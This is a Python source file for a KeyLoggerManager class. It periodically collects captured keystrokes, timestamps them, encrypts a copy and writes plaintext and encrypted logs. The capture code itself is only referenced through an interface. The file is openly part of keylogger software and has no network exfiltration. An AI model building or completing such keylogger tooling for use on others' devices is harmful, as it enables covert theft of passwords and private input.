import time
from datetime import datetime


class KeyLoggerManager:
    """
    Manages the keylogger service, collects keystrokes, processes data, and writes logs at a specified interval.

    Responsibilities:
    - Starts and stops the keylogger.
    - Collects keystrokes at a defined time interval.
    - Adds a timestamp to collected logs.
    - Encrypts logs if required.
    - Writes logs to the specified log writer(s).
    """

    def __init__(self, keylogger, log_writer, encrypted_log_writer, encryptor, interval=10):
        """
        Initializes the KeyLoggerManager.

        Args:
            keylogger (KeyloggerInterface): The keylogger instance to capture keystrokes.
            log_writer (LogWriterInterface): Log writer for storing plaintext logs.
            encrypted_log_writer (LogWriterInterface): Log writer for storing encrypted logs.
            encryptor (EncryptorInterface): Encryption mechanism for logs.
            interval (int, optional): Log collection interval in seconds. Defaults to 10.
        """
        self.keylogger = keylogger
        self.log_writer = log_writer
        self.writer_for_encrypted_log = encrypted_log_writer
        self.encryptor = encryptor
        self.interval = interval
        self.running = False

    def start(self):
        """Starts the keylogger and begins periodic log collection."""
        self.running = True
        self.keylogger.start()

        try:
            while self.running and self.keylogger.running:
                time.sleep(self.interval)
                self._collect_and_store_logs()
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Stops the keylogger and terminates log collection."""
        self.running = False
        self.keylogger.stop()
        print("Keylogger Manager stopped.")

    def _collect_and_store_logs(self):
        """Collects keystrokes, processes them, and writes to log files."""
        logs = self.keylogger.get_log()
        if not logs:
            return  # No new keystrokes, skip writing

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = {timestamp: logs}

        # Encrypt logs
        encrypted_logs = self.encryptor.get_encrypted_dict(self.encryptor.encrypt, log_entry)

        # Write to log writers
        self.log_writer.write_log(log_entry)
        self.writer_for_encrypted_log.write_log(encrypted_logs)
